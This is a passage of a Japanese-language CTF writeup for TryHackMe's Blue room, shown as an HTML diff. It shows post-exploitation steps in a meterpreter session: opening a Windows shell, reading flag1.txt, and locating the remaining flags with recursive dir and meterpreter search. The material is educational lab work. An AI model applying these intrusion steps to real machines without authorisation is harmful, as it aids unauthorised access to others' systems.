+まず<code>shell</code>に入り</p>
+<pre><code class="language-shell">meterpreter &gt; shell
+Process 1076 created.
+Channel 1 created.
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32&gt;
+</code></pre>
+<p><code>C直下</code>に移動</p>
+<pre><code class="language-bash">C:\Windows\system32&gt;cd C:\
+cd C:\
+
+C:\&gt;dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is E611-0B66
+
+ Directory of C:\
+
+05/11/2026  09:22 PM    &lt;DIR&gt;          badr
+03/17/2019  02:27 PM                24 flag1.txt
+07/13/2009  10:20 PM    &lt;DIR&gt;          PerfLogs
+04/12/2011  03:28 AM    &lt;DIR&gt;          Program Files
+03/17/2019  05:28 PM    &lt;DIR&gt;          Program Files (x86)
+12/12/2018  10:13 PM    &lt;DIR&gt;          Users
+03/17/2019  05:36 PM    &lt;DIR&gt;          Windows
+               1 File(s)             24 bytes
+               6 Dir(s)  20,437,475,328 bytes free
+
+C:\&gt;type flag1.txt
+type flag1.txt
+flag{access_the_machine}
+C:\&gt;
+
+</code></pre>
+<p>1つ目のフラグを見つけた。残り2つ。</p>
+<p>ファイル名検索で探したいと思う</p>
+<p>ここは<code>dir</code>を使う<br>
+<code>dir</code>単体なら<code>ls</code>と同じ<br>
+<code>dir aaa</code>ならそのディレクトリ直下を検索<br>
+<code>dir /s aaa</code>ならディレクトリ以下も再帰的に検索</p>
+<pre><code class="language-bash">C:\&gt;dir /s flag* 
+dir /s flag*
+ Volume in drive C has no label.
+ Volume Serial Number is E611-0B66
+
+ Directory of C:\
+
+03/17/2019  02:27 PM                24 flag1.txt
+               1 File(s)             24 bytes
+
+ Directory of C:\Users\Jon\AppData\Roaming\Microsoft\Windows\Recent
+
+03/17/2019  02:26 PM               482 flag1.lnk
+03/17/2019  02:30 PM               848 flag2.lnk
+03/17/2019  02:32 PM             2,344 flag3.lnk
+               3 File(s)          3,674 bytes
+
+ Directory of C:\Users\Jon\Documents
+
+03/17/2019  02:26 PM                37 flag3.txt
+               1 File(s)             37 bytes
+
+ Directory of C:\Windows\System32\config
+
+03/17/2019  02:32 PM                34 flag2.txt
+               1 File(s)             34 bytes
+
+     Total Files Listed:
+               6 File(s)          3,769 bytes
+               0 Dir(s)  20,437,475,328 bytes free
+
+C:\&gt;
+</code></pre>
+<p>全部の旗を見つけられた。<br>
+他の方法でも探しだせる</p>
+<p>meterpreterから試行</p>
+<pre><code class="language-bash">meterpreter &gt; search flag*
+[-] You must specify a valid file glob to search for, e.g. &gt;search -f *.doc
+meterpreter &gt; search -f flag*
+Found 6 results...
+==================
+
+Path                                                             Size (bytes)  Modified (UTC)
+----                                                             ------------  --------------
+c:\Users\Jon\AppData\Roaming\Microsoft\Windows\Recent\flag1.lnk  482           2019-03-18 04:26:42 +0900
+c:\Users\Jon\AppData\Roaming\Microsoft\Windows\Recent\flag2.lnk  848           2019-03-18 04:30:04 +0900
+c:\Users\Jon\AppData\Roaming\Microsoft\Windows\Recent\flag3.lnk  2344          2019-03-18 04:32:52 +0900
+c:\Users\Jon\Documents\flag3.txt                                 37            2019-03-18 04:26:36 +0900
+c:\Windows\System32\config\flag2.txt                             34            2019-03-18 04:32:48 +0900
+c:\flag1.txt                                                     24            2019-03-18 04:27:21 +0900
+
+meterpreter &gt; 
+</code></pre>
+<p><code>-f</code>オプションを忘れないように</p>
+<p>おわり</p>
+    </article>
+  </main>
+
+  <footer>
+    <p>Educational CTF writeup for <a href="https://tryhackme.com/room/blue">https://tryhackme.com/room/blue</a></p>
+  </footer>
+</body>
+</html>
